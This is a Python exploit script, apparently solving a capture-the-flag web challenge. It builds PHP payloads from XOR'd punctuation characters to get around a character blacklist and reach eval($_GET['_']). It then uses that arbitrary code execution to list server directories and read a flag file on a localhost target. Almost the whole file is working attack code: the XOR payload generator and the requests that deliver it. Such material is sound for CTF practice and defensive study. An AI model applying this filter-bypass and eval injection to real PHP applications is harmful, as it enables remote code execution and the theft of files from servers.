import string,requests

def create_payload(strings=b""):
    all_key = b"&|\[]\"#$%\'()*+,-./:;<=>?^_{}`"
    # all_key = b"!\"#$%&\'()*+,-./:;<=>?@[\]^_{|}`"
    gets = ""
    keys = ""
    result = {}

    for i in strings:
        for j in all_key: 
            for z in all_key:
                if z^j == i:                
                    gets += chr(j)  
                    keys += chr(z)
                    result[chr(i)] = ".".join(["('"+ gets[i] + "'" + f"^'{keys[i]}')" for i in range(len(gets))])          
                    gets = ""
                    keys = ""
                    break

    payloads = []
    blacklist = {'!':"('}'^'\\')","@":"('}'^'=')"}
    for i in strings:            
        try:
            payloads.append(result[chr(i)])
    
        except KeyError as e: 
            payloads.append(str(e))
        
    return ".".join(payloads).replace("\\","\\\\")

def read_flag(url):
    payload_get = "?_= echo gzread(gzopen('z1n1_flagnya_om_slashr00t_5.txt','r'),1024);"
    payload_post = create_payload(b"eva") + ".((',')^('}'^'='))" + ".'('.('{'^'_').('`'^'?').('`'^'\\'').('`'^'%').('}'^')').('`'^';')." + "'\\'_\\''" + ".('`'^'=').')'" # -> eval($_GET['_'].';')
    return requests.post(url+payload_get,data={"e":payload_post}).text
def get_dir_list(url):
    payload_get = "?_=$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$it->rewind();print_r(iterator_to_array($it));"
    payload_post = create_payload(b"eva") + ".((',')^('}'^'='))" + ".'('.('{'^'_').('`'^'?').('`'^'\\'').('`'^'%').('}'^')').('`'^';')." + "'\\'_\\''" + ".('`'^'=').')'" # -> eval($_GET['_'].';')
    return requests.post(url+payload_get,data={"e":payload_post}).text

# list dir
# url = "http://localhost:6074/slashroot/cmd.php?_=$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$it->rewind();print_r(iterator_to_array($it));"

# read file
# url = "http://localhost:6074/slashroot/soal_fix/index.php?_= echo gzread(gzopen('z1n1_flagnya_om_slashr00t_5.txt','r'),1024);"

print(get_dir_list("http://localhost:6074/slashroot/soal_fix/index.php"))
print(read_flag("http://localhost:6074/slashroot/soal_fix/index.php"))